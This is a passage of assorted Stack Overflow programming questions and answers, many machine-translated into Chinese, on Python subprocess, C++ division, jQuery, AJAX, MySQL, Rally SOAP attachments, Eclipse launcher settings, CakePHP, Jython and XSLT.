                InputStream is = classLoader.getResourceAsStream("mesh.xml");
                BufferedReader br = new BufferedReader(new InputStreamReader(is));
                String s = "";
                while ((s = br.readLine()) != null)  {
                    System.out.println(s);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
} 
```

我的输入文件不在包中；我将它放在我添加到我的 CLASSPATH 的 /resources 目录中。

# python - Python: get command name of Popen instance

> ID：10989077
> 
> 赞同：4
> 
> 时间：2012-06-12T00:14:39.297
> 
> 标签：python, python-2.7, popen

I have an instance of the Popen class created through subprocess.Popen. I would like to get the name of that process, but I can't find any method or instance variable that would let me get at that. For example, if I had:

```
p = subprocess.Popen('ls') 
```

I would like to find a method to give me the name of the process, something that would work like:

```
>>> p.name()
ls 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T01:40:01.937

The answer is no, until the latest versions of Python (non-stable).

Looking at [the source for 3.2.3](http://hg.python.org/cpython/file/3d0686d90f55/Lib/subprocess.py), you can see that information isn't stored in the object (it is discarded). However, in [the latest development version of Python](http://hg.python.org/cpython/file/c2910971eb86/Lib/subprocess.py), it has been added as `subprocess.Popen.args`.

So, presuming this makes it into 3.3, the only time you will see this as a feature is then. The development docs don't mention it, but that could just be them not being updated. The fact that it's not prefixed with an underscore (`_args`) implies that it is intended to be a public attribute.

If you are desperate to do this as part of the object, the easiest answer is simply to subclass `subprocess.Popen()` and add the data yourself. That said, I really don't think it's worth the effort in most cases.

```
>>> class NamedPopen(Popen):
...     def __init__(self, cargs, *args):
...         Popen.__init__(self, cargs, *args)
...         self.args = cargs
... 
>>> x = NamedPopen("ls")
>>> x.args
'ls' 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T01:43:17.047

As mentioned by Lattyware, If you're making the Popen call yourself, you can just save it then to retrieve later. You don't actually need a container class to use do this, as you can just store it in the instance's internal **dict**:

```
>>> import subprocess
>>> 
>>> to_exec = 'ls'
>>> p = subprocess.Popen(to_exec)
>>> p.name = to_exec 
```

and then later:

```
>>> p.name
'ls'
>>> 
```

# floating-point - 如何从两个整数输入产生十进制结果？

> ID：10989078
> 
> 赞同：2
> 
> 时间：2012-06-12T00:15:07.890
> 
> 标签：floating-point, integer

我在我的 C++ 程序中编写了以下代码，但在接近尾声时，我需要计算`x1 / SumOfIntegers`. 我是一个完全的初学者，我非常感谢任何可以帮助我弄清楚如何产生小数结果作为答案的人。我一直使用 2 作为我所有的整数输入，所以`x1 = 2`和`SumOfIntegers = 10`. 因此`x1 / SumOfIntegers`应该相等`.2`，但我一直得到`1`输出。有人可以帮帮我吗？

```
#include <iostream>
#include "graphics.h"
#define     _USE_MATH_DEFINES
#include "math.h"

using namespace std;

int main()
{

    double x1;
    double x2;
    double x3;
    double x4;
    double x5;
    double SumOfIntegers;
    const double Radius = 250;
    double CircumferenceOfCircle;
    double x1PercentOfTotal;

    cout <<
        "You will be prompted to enter five integers for a pie chart \n";

    cout << "Enter integer 1: ";
    cin >> x1;

    cout << "Enter integer 2: ";
    cin >> x2;

    cout << "Enter integer 3: ";
    cin >> x3;

    cout << "Enter integer 4: ";
    cin >> x4;

    cout << "Enter integer 5: ";
    cin >> x5;

    cout << "Sum of integers: " << x1 + x2 + x3 + x4 + x5 << endl;
    cin >> SumOfIntegers;

    cout << "Circumference of Circle: " << 2 * (M_PI) * Radius << endl;
    cin >> CircumferenceOfCircle;

    cout << "x1 Percentage of Total " << (double)(x1) /
        (double)(SumOfIntegers) << endl;
    cin >> x1PercentOfTotal;

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T00:25:48.183

您忘记计算`SumOfIntegers`值：

```
cout << "Sum of integers: " << x1 + x2 + x3 + x4 + x5 << endl;
cin >> SumOfIntegers; 
```

您要求*用户*输入总和，而用户通常在数据输入方面*非常*糟糕。我建议你自己*存储*价值。（我还建议在继续之前*不要*等待用户输入。这很烦人。）

尝试这个：

```
SumOfIntegers = x1 + x2 + x3 + x4 + x5;
cout << "Sum of integers: " << SumOfIntegers << endl; 
```

（特别注意我已经删除了这`cin >> SumOfIntegers`条线。

要具体了解我在说什么，只需在运行之间更改一个值：

```
$ echo "1 2 3 4 5 6 8" | ./foo 
You will be prompted to enter five integers for a pie chart 
Enter integer 1: Enter integer 2: Enter integer 3: Enter integer 4: Enter integer 5: Sum of integers: 15
Circumference of Circle: 1570.8
x1 Percentage of Total 0.166667
$ echo "1 2 3 4 5 100 7" | ./foo 
You will be prompted to enter five integers for a pie chart 
Enter integer 1: Enter integer 2: Enter integer 3: Enter integer 4: Enter integer 5: Sum of integers: 15
Circumference of Circle: 1570.8
x1 Percentage of Total 0.01 
```

将其从 更改`6`为`100`给出了不同的值 -`0.166667`与`0.01`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T00:29:34.697

由于除法运算符在 C++ 中的工作方式（不要问为什么，这很愚蠢，但就是这样），当每个数字都是整数时，它会觉得它很奇怪。如果您在其中一个数字的末尾实现 .0 ，它将起作用。

前任：

2.0 而不是 2

这台机器上没有安装 Visual Studio，所以我无法验证 x1 + 0.0 是否可以工作，但可以尝试一下。

最好是计算总和而不是输入它。

PS你也不需要做演员来加倍。因为它们都已经是双打了，所以你将双打转换为双打，除了浪费时钟周期之外什么也没做。只需 x1/SumOfIntegers 即可。

# jquery - 简单的切换只工作一次

> ID：10989079
> 
> 赞同：-1
> 
> 时间：2012-06-12T00:15:08.820
> 
> 标签：jquery

我正在尝试使用 jquery 在我的网站菜单上创建一个快速搜索功能。代码非常简单，当用户单击将成为每个页面菜单一部分的“快速搜索”链接时，将出现一个输入文本字段，他们可以快速搜索他们想要的任何内容。我的代码适用于一个切换，但不是更多。我一直在尝试解决这个问题，它应该很简单，所以我很沮丧。我希望这里有人可以帮助我解决这个问题？

注意：我的代码在 jsfiddle 上不止一次工作，但在其他任何地方都没有。-_-

标记

```
<a href="#"> Register</a>  |
    <a href="#">My Account</a>  |
    <span>
        <span id="quicksearch" style="cursor:pointer; color:blue;"><a href="#">Quick Search</a></span>
        <input id="quickbox" type="text" style="float:right; display:none; padding:2px 5px 3px 5px; border:2px solid #ddd; margin-left:-110px; position:absolute; margin-top:20px;"/>
    </span> 
```

jQuery

```
<script type="text/javascript">
$(document).ready(function(){
    $("#quicksearch").click(function(){          
        $("#quickbox").toggle();
    });
});
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T00:35:09.490

你的风格搞砸了。修复它，它应该可以工作。见**演示：http:** [//jsfiddle.net/ZAHsv/5/](http://jsfiddle.net/ZAHsv/5/)

您可以使用`.top`和`.left`从`quicksearch`链接定位.. 见下文，

```
$(document).ready(function(){   
    $("#quicksearch").click(function(){
        var qsPos = $(this).position();
        $('#quickbox').css({
             'position': 'absolute', 
             'top': qsPos.top + 20, 
             'left': qsPos.left
         }).toggle();
    });
}); 
```

**演示：http:** [//jsfiddle.net/ZAHsv/7/](http://jsfiddle.net/ZAHsv/7/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T00:54:35.743

[http://jsfiddle.net/5SQNP/](http://jsfiddle.net/5SQNP/)

调用 .hide() 和 .show() 与仅更改`display: block`为.hide() 不同`display: none`。顺便看看这个很酷的测试：http: [//jsperf.com/jquery-css-display-none-vs-hide/2](http://jsperf.com/jquery-css-display-none-vs-hide/2)

当只有 2 种可能的情况（真、假）时，最好使用 an`if...else`而不是 an 。`if...else if`此外，`===`在`==`适用时使用。

[在 JavaScript 比较中应该使用哪个等号运算符（== vs ===）？](https://stackoverflow.com/questions/359494/javascript-vs-does-it-matter-which-equal-operator-i-use)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-12T00:30:28.657

**已编辑**

这是你想要的吗 ？

[http://jsfiddle.net/ZAHsv/8/](http://jsfiddle.net/ZAHsv/8/)

`toggle()`工作正常，但你可以试试这个：

```
$(document).ready(function(){
    var show = true;
    $("#quicksearch").click(function(){
        if ( show == true) {
            $('#quickbox').show();
            show = false;
        }else if ( show == false )
            $('#quickbox').hide();
            show = true;
    });
}); 
```

要固定位置，请在 CSS 中设置样式

# ajax - 需要确保我的 ajax 脚本设置正确

> ID：10989081
> 
> 赞同：0
> 
> 时间：2012-06-12T00:15:56.553
> 
> 标签：ajax

阿贾克斯代码：

```
try { 
    xmlhttp = new XMLHttpRequest(); 
} 
catch(ee) { 
    try { 
        xmlhttp = new ActiveXObject("Msxml2.XMLHTTP"); 
    } 
    catch(e) { 
        try { 
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); 
        } 
        catch(E) { 
            xmlhttp = false; 
        } 
    } 
} 
div_base = ""; 
valor = 0; 

function abre(arquivo,metodo,div) { 
    div_base = div; 
    valor++; 
    xmlhttp.open(metodo,arquivo+"?valor="+valor); 
    xmlhttp.onreadystatechange=response 
    xmlhttp.send(null) 
} 

function response() { 
    nova_div = div_base; 
    document.getElementById(nova_div).innerHTML="<div>Loading...</div>" 
    if (xmlhttp.readyState==4) { 
        document.getElementById(nova_div).innerHTML=xmlhttp.responseText 
    } 
} 
```

html代码：

```
<form> 
    <select name="menu" style="width:400px; height:25px;">
        <option>Change Theme:</option>
        <option></option>
        <option onclick="javascript: abre('Chat_Themes/Default.html','GET','response2');">Default - Shadow Hunters</option> 
        <option onclick="javascript: abre('Chat_themes/Custom.html','GET','response2');">Custom - Shadow Hunters</option>  
    </select> 
</form>
<br />
<div id="response2"></div> 
```

我将“div = responce”更改为“div = responce2”，而没有更改顶部的 ajax 代码，我不确定是否必须更改 ajax 代码，或者我可以保留它，它可以正常工作，但如果它只是谷歌浏览器被延迟，它不适用于谷歌浏览器 idk，但它适用于 ff，即很好，有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T00:40:31.133

尝试缩进你的代码：你会发现你的 try-catch 语句没有匹配的大括号。您也可以尝试像[jshint](http://jshint.com/)这样的 Javascript 验证服务，但缩进应该是第一位的。

您可能需要考虑使用已经具有跨浏览器 AJAX 功能的第三方库，例如[jQuery](http://jquery.com/)。

# mysql - 简单的 MySQL 加入

> ID：10989082
> 
> 赞同：1
> 
> 时间：2012-06-12T00:15:58.123
> 
> 标签：mysql, join

无法理解如何通过第二个表中的标签信息过滤图像表。

所以我有一个包含所有基本字段的图像表：

```
id |
title |
userid |
timestamp |
status 
```

我有一个标签表：

```
id |
imageid |
text (contains a single tag) 
```

我想做的很简单：获取标签列表并获取包含列表中所有标签的图像列表。我只是无法绕过它。

非常感谢任何帮助，谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T00:37:23.630

```
SELECT 
    a.*
FROM 
    images a
INNER JOIN
    tags b ON a.id = b.imageid
WHERE
    b.text IN ('tag1', 'tag2', 'tag3')
GROUP BY
    a.id
HAVING
    COUNT(*) = 3 
```

`'tag1', 'tag2', 'tag3'`是您的输入标签列表子句`3`中`HAVING`的输入是标签列表中的标签计数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T00:22:14.207

假设您没有重复的标签 per `imageid`，您可以加入一个查询，该查询计算每个 id 的标签，将带有`IN()`子句的标签限制为您要搜索的列表。

然后使用一个`HAVING`子句，拒绝计数不等于列表中标签数量的项目（那些少于完整列表的项目）：

```
SELECT 
 images.*
FROM 
  images 
  JOIN (
    SELECT
     imageid,
     COUNT(*) AS numtags
     /* could also be COUNT(DISTINCT text) */
    FROM tags
    /* Put only the tags you want into an IN() clause */
    WHERE text IN ('tag1,'tag2','tag3')
    GROUP BY imageid
    /* If an image has all 3 tags, COUNT(*) = 3 */
    HAVING numtags = 3
  ) tlist ON images.id = tlist.imageid 
```

# rally - Rally SOAP API - 如何将附件添加到分层要求？

> ID：10989084
> 
> 赞同：0
> 
> 时间：2012-06-12T00:16:02.240
> 
> 标签：rally

我已按照[此代码](https://stackoverflow.com/questions/10372917/rally-soap-api-how-do-i-add-an-attachment-to-a-testcaseresult)将附件添加到`HierarchicalRequirement`.

我收到以下错误：

```
validation error: Attachment.attachments[0] should not be null 
```

如何将附件添加到分层需求？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:52:09.837

您可以发布说明问题的代码摘录吗？如果您遵循[Rally SOAP API - How do I add an attachment to a TestCaseResult](https://stackoverflow.com/questions/10372917/rally-soap-api-how-do-i-add-an-attachment-to-a-testcaseresult)中的方法，您就走在了正确的轨道上。以下是向故事添加附件时适用于我的快速代码示例：

```
 // issue query for target story
        QueryResult queryResult = service.query(workspace, objectType, queryString, orderString, fetchFullObjects, start, pageSize);

        // look at the object returned from query()
        Console.WriteLine("Query returned " + queryResult.TotalResultCount + " objects");

        // Grab the resulting story
        DomainObject rallyObject = queryResult.Results.First();
        HierarchicalRequirement queryStory = (HierarchicalRequirement)rallyObject;

        // Read In Image Content
        String imageFilePath = "C:\\Users\\username\\";
        String imageFileName = "image1.png";
        String fullImageFile = imageFilePath + imageFileName;
        var imageFileLength = new FileInfo(fullImageFile).Length;
        Image myImage = Image.FromFile(fullImageFile);

        Console.WriteLine("Image File Length: " + imageFileLength);

        // Convert Image to Byte Array format
        byte[] imageByteArray = ImageToByteArray(myImage, System.Drawing.Imaging.ImageFormat.Png);
        var imageNumberBytes = imageByteArray.Length;

        // Create the Attachment Content
        AttachmentContent attachmentContent = new AttachmentContent();
        attachmentContent.Content = imageByteArray;
        attachmentContent.Workspace = workspace;
        CreateResult result = service.create(attachmentContent);
        attachmentContent = (AttachmentContent)result.Object;

        // Create the Attachment Container, wire it up to the AttachmentContent
        Attachment myAttachment = new Attachment();
        myAttachment.ContentType = "image/png";
        myAttachment.Content = attachmentContent;
        myAttachment.Name = "image1.png";
        myAttachment.Size = imageNumberBytes ;
        myAttachment.SizeSpecified = true;
        myAttachment.User = user;
        myAttachment.Artifact = queryStory;
        myAttachment.Workspace = workspace;

        // Create the attachment in Rally
        result = service.create(myAttachment);
        Console.WriteLine(result.Object);

    }

    public static byte[] ImageToByteArray (Image image, System.Drawing.Imaging.ImageFormat format)
    {
        using (MemoryStream ms = new MemoryStream())
        {
            // Convert Image to byte[]
            image.Save(ms, format);
            byte[] imageBytes = ms.ToArray();

            return imageBytes;
        }
    }
} 
```

# mysql - != 上没有索引？

> ID：10989085
> 
> 赞同：7
> 
> 时间：2012-06-12T00:16:02.803
> 
> 标签：mysql, sql, performance, database-performance

考虑以下两个解释：

```
EXPLAIN SELECT * FROM sales WHERE title != 'The'

id  select_type table   type    possible_keys   key key_len ref rows    Extra
1   SIMPLE      sales   ALL      title        NULL  NULL    NULL    41707   Using where 
```

和 -

```
EXPLAIN SELECT * FROM sales WHERE title = 'The'
id  select_type table   type    possible_keys   key key_len ref rows    Extra
1   SIMPLE      sales   ref      title         title    767 const   1   Using where 
```

为什么`!=`查询有`NULL`键？为什么不使用`title`？是什么导致`=`语句能够使用索引但不能使用`!=`？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-12T00:24:02.170

除非非常频繁，否则使用索引是没有意义的`title`。`'The'`

由于几乎每一行都需要被选中，因此您不会从使用索引中获得任何收益。使用索引实际上可能会很昂贵，这可能是您的 MySQL 引擎正在确定的，因此它选择不使用索引。

比较在这两种情况下完成的工作量：

使用索引：

> 1) 将整个索引树读入内存。
> 2) 在索引树中搜索值“The”并过滤掉这些条目。
> 3）从表中读取除少数例外（可能与需要读取的行在磁盘上的相同块中，因此很可能读入整个表）之外的每一行到内存中。

没有索引：

> 1) 将每一行读入内存，并在读取它们时从结果集中过滤掉任何 where `title`=`'The'`

# eclipse - eclipse --launcher.ini 开关

> ID：10989091
> 
> 赞同：2
> 
> 时间：2012-06-12T00:17:01.947
> 
> 标签：eclipse

我们正在使用 eclipse 的共享安装（RAD 7.0，在 Citrix 下）。我们需要允许每个开发人员提供 eclipse.ini 的本地副本。“--launcher.ini”命令行开关应该允许我们这样做，但我无法让 eclipse 识别 eclipse.ini 的本地副本。我看到的行为对于 RAD 7.0 和 Indigo（测试速度更快）都是一致的。

为了测试这一点，我使用了非共享 Indigo 安装并在 C:\Temp 中创建了 eclipse.ini 的本地副本，并添加了“-showlocation”开关作为第一个参数；在 Eclipse 打开时，在默认的 ini 文件中正确显示工作区路径，因此您可以立即知道本地 eclipse.ini 是否已被处理。

eclipse 文档将开关的格式显示为“--launcher.ini {location}”。我已经尝试使用我能想到的每种组合修改桌面快捷方式：引用与未引用，仅完整路径与文件夹名称，“”，“=”和“：”来分隔参数值，但无论如何都没有eclipse 找到本地副本并在标题栏中显示工作区名称。

任何人都可以提出为什么这个开关显然没有被识别，或者提供一个可行的例子吗？如果您有通过 Citrix 桌面图标中的 Citrix "/param:" 参数传递此开关的经验，我真的很高兴看到一个工作示例。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T13:09:03.673

我通过将以下内容添加到我的 eclipse.ini 中对其进行了测试：

```
-name
OriginalINI 
```

然后我复制的 eclipse.ini 有：

```
-name
CopiedINI 
```

[-name](http://help.eclipse.org/indigo/index.jsp?topic=/org.eclipse.platform.doc.isv/reference/misc/runtime-options.html)影响启动画面的“窗口”名称，因此它在启动时显示。正常启动时，初始屏幕窗口显示原始名称。使用以下命令启动，它显示了复制的 eclipse.ini 名称：

```
eclipse/eclipse --launcher.ini $(pwd)/eclipse.ini 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T06:48:33.927

我发现“--launcher.ini”仅适用于 Vista，如果启动器没有其他参数。例如

```
eclipse --launcher.ini myOther.ini (works)

eclipse -console --launcher.ini myOther.ini (doesn't work on Vista)

eclipse --launcher.ini myOther.ini -console (doesn't work on Vista) 
```

# cakephp - 检查 cakephp 上是否存在图像

> ID：10989097
> 
> 赞同：2
> 
> 时间：2012-06-12T00:18:27.167
> 
> 标签：cakephp

我在 CakePHP 中有一个项目，如果不使用扩展名 '.JPG'，我想知道如何检查扩展名为 '.jpg' 的图像是否存在，任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T00:24:48.627

bool file_exists ( 字符串 $filename )

检查文件或目录是否存在。如果 filename 指定的文件或目录存在，则返回 TRUE；否则为假。

[http://php.net/manual/en/function.file-exists.php](http://php.net/manual/en/function.file-exists.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-09-27T05:01:39.920

```
$file = WWW_ROOT . 'img' . DS . 'uploads' . DS . 'file123.jpg'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-09-28T11:37:38.610

我的图像路径，如 app/webroot/img/upload/file123.jpg

WWW_ROOT 定义您的 webroot 文件夹路径，DS 定义 '/'

```
$image='file123.jpg';
$file = WWW_ROOT . 'img' . DS . 'uploads' . DS . $image; 
```

if 文件检查条件

```
if(file_exists($file) && $image){
 enter your code if file exists
 }else{
 file not exists
} 
```

# python - Jython 和 Python 的区别

> ID：10989098
> 
> 赞同：15
> 
> 时间：2012-06-12T00:18:41.733
> 
> 标签：python, syntax, jython

我知道 Jython 将 Python 代码转换为 Java 字节码，但是两者之间有任何语法变化吗？作为一个附带问题，Jython 3.x 是否可用，还是仍在移植？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-03T04:47:32.463

简而言之

## Python 和 Jython 的区别

### Python

1.  C
2.  多平台
3.  编译为 .pyc
4.  用 C 扩展
5.  吉尔 1*
6.  Python 垃圾回收

1*。全局解释器锁，在[文档](https://docs.python.org/3/)Python 文档中解释，第 8.1 章 (1)

### 杰通

1.  100% 爪哇
2.  任何 JVM（当前为 1.1+）
3.  编译为 .class
4.  用 Java 扩展
5.  真正的多线程
6.  Java 垃圾回收

有关更多信息，没有什么比在[网站上访问更好的了](http://wiki.python.org/)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-06-12T00:25:41.873

Jython 是 Python 语言的一种[实现](http://www.jython.org/jythonbook/en/1.0/LangSyntax.html#the-difference-between-jython-and-python)。它根本不是一种不同的语言。

据[Jython 官网](http://www.jython.org/)介绍，目前最新的稳定版本是 2.5.3b1，最新的开发版本是 2.7a2。据我所知，目前没有人在开发与 3.x 兼容的 Jython 版本。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-08-19T03:51:16.190

Python 语言有 3 个主要的实现。Jython 是 java 实现，Cython 是 C 实现，IronPython 是 c# 实现。就 Python 语言语法而言，它在所有实现中保持一致。关于你问题的最后一部分，我认为 Jython 版本 3.x 尚未发布或使用，可能你的意思是 python 3.x - 如果是这样，是的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-12T00:23:47.240

看看这些网站：

1) [CPython 和 Jython 的区别](http://www.jython.org/archive/21/docs/differences.html)

2) [Jython 常见问题解答](https://wiki.python.org/jython/JythonFaq/GeneralInfo#Is_Jython_the_same_language_as_Python.3F)

# xml - 使用 XSLT 将样本行上的标签作为数据保留

> ID：10989101
> 
> 赞同：0
> 
> 时间：2012-06-12T00:18:59.273
> 
> 标签：xml, xslt

我正在尝试创建企业目录。生成的 XML 需要使用 XSLT 进行一些工作。我创建了以下 XSLT 来插入必要的样板文件，并根据需要将数据标签和元素组合/显示在一起。

下面的 XSLT 几乎完成了我想要的一切，但它正在做一些我不想要的事情，当我希望它们在同一行时，它会将一些元素放在不同的行上。例如，元素`<CorrespondingBankLabel>`应该在同一行`<CorrespondingBank>`

我确信答案很简单，但我一直无法弄清楚。

这是完整的 XSLT

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output omit-xml-declaration="yes" indent="yes" />
<xsl:strip-space elements="*"/>

<xsl:output method="html" encoding="UTF-8" doctype-public="-//W3C//DTD XHTML 1.0 Transitional//EN" doctype-system="http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"/>
<xsl:template match="/">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<title>Untitled Document</title>
</head>
<body><xsl:apply-templates select="Root/Story/CL"/></body>
</html>
</xsl:template>

<xsl:template match="CityDescription">
<xsl:text>
</xsl:text><CityDescription><xsl:value-of select="."/></CityDescription><xsl:text>  </xsl:text>
</xsl:template>
<xsl:template match="Population">
<Population><xsl:value-of select="."/></Population><xsl:text>
</xsl:text>
</xsl:template>

<xsl:template match="BankName | Address1 | Hours | Established | RoutingNbr | Zip | Fax | Phone | Email | Employee | IBAGroup | FDICNbr | OfficeOfLabel | CO/CityOfficeLabel | CO/CityOfficeAddress1 | CO/CityOfficeZip | CO/CityOfficePhone | CO/CityOfficeAddress2 ">
<xsl:element name="{name()}">
<xsl:value-of select="."/>
</xsl:element>
</xsl:template>

<xsl:template match="BK"><xsl:text>
</xsl:text><xsl:apply-templates select="BankName"/><xsl:text>   </xsl:text><xsl:apply-templates select="Established"/><xsl:text>    </xsl:text><xsl:apply-templates select="RoutingNbr"/><xsl:text>
</xsl:text><xsl:apply-templates select="OfficeOfLabel"/>
<xsl:apply-templates select="Address1"/><xsl:text>  </xsl:text><xsl:apply-templates select="Hours"/>        
<xsl:text>
</xsl:text><xsl:apply-templates select="Address2"/><xsl:apply-templates select="Zip"/>
<xsl:apply-templates select="Phone"/><xsl:text> </xsl:text><xsl:apply-templates select="Fax"/>
<xsl:apply-templates select="Email"/>
<xsl:apply-templates select="Web"/>
<xsl:apply-templates select="HoldingCo"/>
<xsl:apply-templates select="TotalAssets"/><xsl:apply-templates select="TotalLiabilities"/>
<xsl:apply-templates select="TotalDeposits"/><xsl:text> </xsl:text><xsl:apply-templates select="EquityCapital"/><xsl:text>
</xsl:text><xsl:apply-templates select="EH/Employee"/><xsl:text>
</xsl:text><xsl:apply-templates select="IBAGroup"/><xsl:apply-templates select="FDICNbr"/><xsl:text>
</xsl:text><xsl:apply-templates select="D"/>
<xsl:apply-templates select="CB"/>
<xsl:apply-templates select="OFF"/>
<xsl:apply-templates select="CO"/>
<xsl:apply-templates select="MultiBankLabel"/>
</xsl:template>

<xsl:template match="HoldingCo">
 <HoldingCo>
  <xsl:text>Holding Co: </xsl:text>
  <xsl:value-of select="."/>
 </HoldingCo>
</xsl:template>

<xsl:template match="Address2">
<Address2><xsl:value-of select="."/></Address2><xsl:text>   </xsl:text>
</xsl:template>

<xsl:template match="Email">
 <Email>
  <xsl:text>e-Mail: </xsl:text>
  <xsl:value-of select="."/>
 </Email>
</xsl:template>

<xsl:template match="Web">
 <Web>
  <xsl:text>Web: </xsl:text>
  <xsl:value-of select="."/>
 </Web>
</xsl:template>

<xsl:template match="TotalAssets">
 <TotalAssets>
  <xsl:text>Total Assets    $</xsl:text>
  <xsl:value-of select="."/>
 </TotalAssets><xsl:text>   </xsl:text>
</xsl:template>

<xsl:template match="TotalLiabilities">
 <TotalLiabilities>
  <xsl:text>Total Liabilities   $</xsl:text>
  <xsl:value-of select="."/>
 </TotalLiabilities>
</xsl:template>

<xsl:template match="TotalDeposits">
 <TotalDeposits>
  <xsl:text>Total Deposits  </xsl:text>
  <xsl:value-of select="."/>
 </TotalDeposits><xsl:text> </xsl:text>
</xsl:template>

<xsl:template match="EquityCapital">
 <EquityCapital>
  <xsl:text>Equity Capital  </xsl:text>
  <xsl:value-of select="."/>
 </EquityCapital>
</xsl:template>

<xsl:template match="IBAGroup">
 <IBAGroup>
  <xsl:text>IBA Group: </xsl:text>
  <xsl:value-of select="."/>
 </IBAGroup><xsl:text>  </xsl:text>
</xsl:template>

<xsl:template match="FDICNbr">
 <FDICNbr>
  <xsl:text>FDIC Certificate No.: </xsl:text>
  <xsl:value-of select="."/>
 </FDICNbr>
</xsl:template>
<xsl:template match="OFF"><OfficeLabel><xsl:value-of select="OfficeLabel"/><xsl:text>: </xsl:text> </OfficeLabel><Office><xsl:value-of select="Office"/></Office></xsl:template> 

<xsl:template match="D"><DirectorLabel><xsl:value-of select="DirectorLabel"/><xsl:text>: </xsl:text></DirectorLabel><Director><xsl:value-of select="Director"/></Director></xsl:template> 

<xsl:template match="CB"><CorrespondingBankLabel><xsl:value-of select="CorrespondingBankLabel"/><xsl:text>: </xsl:text></CorrespondingBankLabel><CorrespondingBank><xsl:value-of select="CorrespondingBank"/></CorrespondingBank></xsl:template> 
</xsl:stylesheet> 
```

这是一些示例 XML：

```
<?xml version="1.0" encoding="UTF-8"?>
<Root>
<Story>
<CL>
<CityDescription>ACKLEY, HARDIN CO.</CityDescription>
<Population>POP. 1589</Population>
<BK><BankName>Ackley State Bank</BankName><BankType>BANKS</BankType><Established>Est. 1934</Established><RoutingNbr>0739-0535-2</RoutingNbr><Address1>650 Main St</Address1><Hours>Hrs: M-F 8-3</Hours><Address2>PO Box 149</Address2><Zip>50601-1438</Zip><Fax>FAX: (641) 847-2011</Fax><Phone>(641) 847-2651</Phone><Email>e-Mail: asbinfo@bankasb.com</Email><WebURL>Web: www.ackleystatebank.com</WebURL><HoldingCo>GNB Bancorporation, Grundy Center</HoldingCo><SubChapS>Yes</SubChapS><TotalAssets>128,319,000</TotalAssets><TotalLiabilities>117,059,000</TotalLiabilities><TotalDeposits>89,847,000</TotalDeposits><EquityCapital>11,260,000</EquityCapital><IBAGroup>7</IBAGroup><FDICNbr>14936</FDICNbr>
<EH><Employee>Kevin Swalley, Chmn</Employee></EH><EH><Employee>V.J. Barker, Pres</Employee></EH><EH><Employee>Kathy M Eichmeier, VP, Cash</Employee></EH><EH><Employee>Darren Janssen, VP</Employee></EH><EH><Employee>Gene Sandell, CFO</Employee></EH><EH><Employee>Angela M Luhring, SLO</Employee></EH><EH><Employee>Briget Meyer, Mktg</Employee></EH><EH><Employee>Josh Meyer, LO</Employee></EH><EH><Employee>Sharon Pudenz, LO</Employee></EH><EH><Employee>Deb Willms, TO</Employee></EH>
<D><DirectorLabel>Directors</DirectorLabel><Director>Doug Hofmeister, Hollis Janssen, Joseph Wojcik, Bob Johanns, Steve McDowell, Kevin Swalley, Mark Sexton, Verlin (Gus) Barker</Director></D>
<CB><CorrespondingBankLabel>Correspondent Banks</CorrespondingBankLabel><CorrespondingBank>Bankers Bank, Madison; FHLB, Des Moines; Quad City Bank &amp; Trust; UMB, Kansas City; US Bank, NA, Cedar Rapids</CorrespondingBank></CB>
<OFF><OfficeLabel>Offices</OfficeLabel><Office>Geneva, Iowa Falls, Story City</Office></OFF>
</BK>
<BK><BankName>Green Belt Bank &amp; Trust</BankName><RoutingNbr>0739-2167-9</RoutingNbr><Address1>419 Sherman Ave</Address1><Zip>50601-1206</Zip><Fax>FAX: (641) 847-0022</Fax><Phone>(641) 847-0011</Phone><OfficeOfLabel>Office of Green Belt Bank &amp; Trust, Iowa Falls</OfficeOfLabel>
<EH><Employee>Janet DeBerg, VP, OM</Employee></EH>
</BK>
<BK><BankName>Peoples Savings Bank</BankName><Address1>33149 161st St</Address1><Zip>50601-7774</Zip><Fax>FAX: (641) 847-2602</Fax><Phone>(641) 847-3126</Phone><OfficeOfLabel>Office of Peoples Savings Bank, Wellsburg</OfficeOfLabel>
<EH><Employee>Lance Haupt, LO</Employee></EH>
</BK>
</CL>
<CL>
<CityDescription>ADAIR, ADAIR CO.</CityDescription>
<Population>POP. 781</Population>
